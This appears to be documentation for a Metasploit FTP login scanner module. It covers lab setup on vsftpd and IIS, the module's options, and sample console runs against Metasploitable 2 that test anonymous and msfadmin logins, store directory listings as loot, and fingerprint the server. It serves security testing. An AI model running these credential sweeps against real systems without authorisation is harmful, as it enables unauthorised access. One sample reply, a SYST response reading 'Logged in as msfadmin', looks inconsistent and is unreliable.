## Vulnerable Application

This module tests FTP logins on a range of machines and reports successful logins.
If a database is connected, successful logins, hosts, and credentials are recorded.
On successful login, the module can optionally check read/write access, store a
directory listing as loot, and fingerprint the server via `FEAT`, `STAT`, and `SYST`.

### Install a FTP server on Kali Linux

1. `apt-get install vsftpd`
2. Allow local users to log in and to allow FTP uploads by editing `/etc/vsftpd.conf`
   and uncommenting the following:

```
local_enable=YES
write_enable=YES
chroot_list_enable=YES
chroot_list_file=/etc/vsftpd.chroot_list
```

3. Create `/etc/vsftpd.chroot_list` and add local users to permit.
4. Start the service: `service vsftpd start`

### Installing FTP for IIS 7.5 on Windows

#### IIS 7.5 for Windows Server 2008 R2

1. On the taskbar, click Start, point to Administrative Tools, and then click Server Manager.
2. In the Server Manager hierarchy pane, expand Roles, and then click Web Server (IIS).
3. In the Web Server (IIS) pane, scroll to the Role Services section, and then click Add Role Services.
4. On the Select Role Services page of the Add Role Services Wizard, expand FTP Server.
5. Select FTP Service. (Note: To support ASP.NET Membership or IIS Manager authentication
   for the FTP service, you will also need to select FTP Extensibility.)
6. Click Next.
7. On the Confirm Installation Selections page, click Install.
8. On the Results page, click Close.

#### IIS 7.5 for Windows 7

1. On the taskbar, click Start, and then click Control Panel.
2. In Control Panel, click Programs and Features, and then click Turn Windows Features on or off.
3. Expand Internet Information Services, then FTP Server.
4. Select FTP Service. (Note: To support ASP.NET Membership or IIS Manager authentication
   for the FTP service, you will also need to select FTP Extensibility.)
5. Click OK.

## Verification Steps

1. Do: `use auxiliary/scanner/ftp/ftp_login`
2. Do: `set RHOSTS [IP]`
3. Do: `set RPORT [PORT]`
4. Do: Either `set USERNAME <username>` and `set PASSWORD <password>`, or `set ANONYMOUS_LOGIN true`
5. Do: `run`

## Options

### ANONYMOUS_LOGIN

Attempt login using various anonymous FTP user accounts with browser-like passwords
(e.g. `mozilla@example.com`). (Default: `false`)

### CHECK_ACCESS

After a successful login, test read/write access by attempting to create and remove a
temporary directory via `MKD`/`RMD`. (Default: `true`)

### STORE_LOOT

After a successful login, retrieve and store the current directory listing as loot.
(Default: `true`)

### EXTENDED_CHECKS

After a successful login, fingerprint the FTP service by issuing `FEAT`, `STAT`, and
`SYST` commands and recording the responses. (Default: `false`)

### SINGLE_SESSION

Disconnect and reconnect between every login attempt rather than reusing the same
connection. Useful against servers that enforce per-session attempt limits.
(Default: `false`)

## Scenarios

### Anonymous login against Metasploitable 2

```
msf > use auxiliary/scanner/ftp/ftp_login
msf auxiliary(scanner/ftp/ftp_login) > set RHOSTS 10.0.0.10
RHOSTS => 10.0.0.10
msf auxiliary(scanner/ftp/ftp_login) > set ANONYMOUS_LOGIN true
ANONYMOUS_LOGIN => true
msf auxiliary(scanner/ftp/ftp_login) > run

[*] 10.0.0.10:21 - Getting FTP banner
[*] 10.0.0.10:21 - FTP Banner: vsFTPd 2.3.4
[*] 10.0.0.10:21 - Starting FTP login sweep
[*] 10.0.0.10:21 - Checking read/write access
[*] 10.0.0.10:21 - Listing directory contents
[*] 10.0.0.10:21 - Directory listing: (empty)
[+] 10.0.0.10:21 - Login Successful: anonymous:mozilla@example.com (Read-only)
[*] 10.0.0.10:21 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Credential brute-force against Metasploitable 2

```
msf > use auxiliary/scanner/ftp/ftp_login
msf auxiliary(scanner/ftp/ftp_login) > set RHOSTS 10.0.0.10
RHOSTS => 10.0.0.10
msf auxiliary(scanner/ftp/ftp_login) > set USERNAME msfadmin
USERNAME => msfadmin
msf auxiliary(scanner/ftp/ftp_login) > set PASSWORD msfadmin
PASSWORD => msfadmin
msf auxiliary(scanner/ftp/ftp_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(scanner/ftp/ftp_login) > set EXTENDED_CHECKS true
EXTENDED_CHECKS => true
msf auxiliary(scanner/ftp/ftp_login) > run

[*] 10.0.0.10:21 - Getting FTP banner
[*] 10.0.0.10:21 - FTP Banner: vsFTPd 2.3.4
[*] 10.0.0.10:21 - Starting FTP login sweep
[*] 10.0.0.10:21 - Checking read/write access
[*] 10.0.0.10:21 - Listing directory contents
[*] 10.0.0.10:21 - Directory listing:
drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable
[+] 10.0.0.10:21 - Directory listing stored to: /home/kali/.msf4/loot/20260507170404_default_10.0.0.10_ftp.dir_listing_925538.txt
[*] 10.0.0.10:21 - Fingerprinting FTP service
[*] 10.0.0.10:21 - Sending FTP command: FEAT
[*] 10.0.0.10:21 - FTP FEAT: 211-Features:
 EPRT
 EPSV
 MDTM
 PASV
 REST STREAM
 SIZE
 TVFS
 UTF8
211 End
[*] 10.0.0.10:21 - Sending FTP command: STAT
[*] 10.0.0.10:21 - FTP STAT: 211-FTP server status:
     Connected to 10.0.0.1
[*] 10.0.0.10:21 - Sending FTP command: SYST
[*] 10.0.0.10:21 - FTP SYST: Logged in as msfadmin
[+] 10.0.0.10:21 - Login Successful: msfadmin:msfadmin (Read/Write)
[*] 10.0.0.10:21 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
